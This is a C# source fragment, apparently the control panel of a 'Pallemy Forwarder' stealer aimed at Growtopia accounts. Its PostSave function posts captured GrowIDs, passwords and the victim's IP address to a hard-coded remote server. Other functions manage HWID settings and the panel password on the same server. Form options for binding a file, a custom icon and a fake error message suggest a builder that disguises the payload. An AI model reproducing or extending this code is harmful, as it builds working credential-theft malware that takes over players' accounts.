                    if (listView1.SelectedIndices.Count > 0)
                        listView1.Items.RemoveAt(listView1.SelectedItems[0].Index);
                }
                catch (Exception)
                {
                    MessageBox.Show("An error was encountered while deleting.", "Pallemy Forwarder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }

            }
        }
        public static string PostSave(string growid, string password, string owner)
        {
            Random generator = new Random();
            int r = generator.Next(100000, 1000000);
            string url = "http://45.155.124.146/S4UCKSMYLIFE/postdata.php";
            string ip = new WebClient().DownloadString("http://icanhazip.com");
            ip = ip.Substring(0, ip.Length - 1);
            var time = DateTime.Now.ToFileTime();
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            string data = "id=" + r + "&growid=" + HttpUtility.UrlEncode(growid) + "&password=" + HttpUtility.UrlEncode(password) + "&ip=" + ip + "&computer=" + "baran" + "&owner=" + usr;
            request.ContentLength = data.Length;
            StreamWriter writer = new StreamWriter(request.GetRequestStream(), Encoding.ASCII);
            writer.Write(data);
            writer.Flush();
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            string encoding = response.ContentEncoding;
            if (encoding == null || encoding.Length < 1)
            {
                encoding = "UTF-8";
            }
            StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encoding));
            data = reader.ReadToEnd();
            response.Close();
            return data;
        }
        public static string DisableHwid(bool durum)
        {
            if (durum == true)
            {
            Random generator = new Random();
            int r = generator.Next(100000, 1000000);
            string url = "http://45.155.124.146/S4UCKSMYLIFE/settings.php";
            string ip = new WebClient().DownloadString("http://icanhazip.com");
            ip = ip.Substring(0, ip.Length - 1);
            var time = DateTime.Now.ToFileTime();
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            string data = "owner=" + usr;
            request.ContentLength = data.Length;
            StreamWriter writer = new StreamWriter(request.GetRequestStream(), Encoding.ASCII);
            writer.Write(data);
            writer.Flush();
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            string encoding = response.ContentEncoding;
            if (encoding == null || encoding.Length < 1)
            {
                encoding = "UTF-8";
            }
            StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encoding));
            data = reader.ReadToEnd();
            response.Close();
            return data;
            }
            else
            {
                Random generator = new Random();
                int r = generator.Next(100000, 1000000);
                string url = "http://45.155.124.146/S4UCKSMYLIFE/settings.php";
                string ip = new WebClient().DownloadString("http://icanhazip.com");
                ip = ip.Substring(0, ip.Length - 1);
                var time = DateTime.Now.ToFileTime();
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";
                string data = "username=" + usr;
                request.ContentLength = data.Length;
                StreamWriter writer = new StreamWriter(request.GetRequestStream(), Encoding.ASCII);
                writer.Write(data);
                writer.Flush();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                string encoding = response.ContentEncoding;
                if (encoding == null || encoding.Length < 1)
                {
                    encoding = "UTF-8";
                }
                StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encoding));
                data = reader.ReadToEnd();
                response.Close();
                return data;
            }
        }
        public static string ChangePassword(string oldpassword, string newpassword)
        {
            string url = "http://45.155.124.146/S4UCKSMYLIFE/passwordchange.php";
            string ip = new WebClient().DownloadString("http://icanhazip.com");
            ip = ip.Substring(0, ip.Length - 1);
            var time = DateTime.Now.ToFileTime();
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            string data = "owner=" + usr + "&oldpw=" + oldpassword + "&newpw=" + newpassword;
            request.ContentLength = data.Length;
            StreamWriter writer = new StreamWriter(request.GetRequestStream(), Encoding.ASCII);
            writer.Write(data);
            writer.Flush();
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            string encoding = response.ContentEncoding;
            if (encoding == null || encoding.Length < 1)
            {
                encoding = "UTF-8";
            }
            StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encoding));
            data = reader.ReadToEnd();
            response.Close();
            return data;
        }

        private void materialCheckBox5_CheckedChanged(object sender, EventArgs e)
        {
            if (!iconz.Checked == false)
            {
                
                using (OpenFileDialog saveFile = new OpenFileDialog())
                {
                    if (saveFile.ShowDialog() == DialogResult.OK)
                    {
                        materialSingleLineTextField2.Text = saveFile.FileName;
                    }
                }

            }
            else
            {
                materialSingleLineTextField2.Text = "Path";
            }
        }

        private void customSavedatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Custom.usr = usr;
            Custom hebe = new Custom();
            hebe.Show();
        }

        private void sendRandomAccountToolStripMenuItem_ClickAsync(object sender, EventArgs e)
        {
            string xd = PostSave("PallemyGrowID", "PallemyPassword", usr);
            if (xd == "OK")
            {
                MessageBox.Show("A test account has been successfully sent.", "Pallemy Forwarder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                GetAccsAsync();
            }
        }
        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                foreach (ListViewItem itemRow in listView1.SelectedItems)
                {
                    string taskDate = itemRow.SubItems[2].ToString();
                    string taskDescription = itemRow.SubItems[3].ToString();
                    string a = taskDate.Replace("ListViewSubItem", "");
                    string asz = a.Replace(": {", "");
                    string adana = asz.Replace("}", "");
                    pass.Text = adana;
                    password.Text = adana;
                    ip.Text = listView1.SelectedItems[0].SubItems[3].Text;
                    computer.Text = listView1.SelectedItems[0].SubItems[4].Text;
                    String text = listView1.SelectedItems[1].Text;
                    growid.Text = text;
                    materialTabControl1.SelectedIndex = 2;
                }
            }
            catch (Exception)
            {
                Application.DoEvents();
            }

        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            System.Windows.Forms.Form.ActiveForm.Opacity = ((double)(trackBar1.Value) / 100.0);
        }

        private void materialCheckBox5_CheckedChanged_1(object sender, EventArgs e)
        {
            if (hwid.Checked == false)
            {
                DisableHwid(true);
            }
            else
            {
                DisableHwid(false);
            }

        }

        private void materialRaisedButton6_Click(object sender, EventArgs e)
        {
            string a = ChangePassword(old.Text, newpw.Text);
            if (a == "wrong")
            {
                MessageBox.Show("Your old password was entered incorrectly.", "Pallemy Forwarder", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {

        }

        private void materialCheckBox4_CheckedChanged(object sender, EventArgs e)
        {
            if (!materialCheckBox4.Checked == false)
            {
                using (OpenFileDialog saveFile = new OpenFileDialog())
                {
                    if (saveFile.ShowDialog() == DialogResult.OK)
                    {
                        bindfile.Text = saveFile.FileName;
                    }
                }

            }
            else
            {
                bindfile.Text = "Path";

            }
        }

        private void materialCheckBox2_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void materialCheckBox6_CheckedChanged(object sender, EventArgs e)
        {
            if (errorr.Checked == true)
            {
                errormsg.Enabled = true;
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }
    }
}
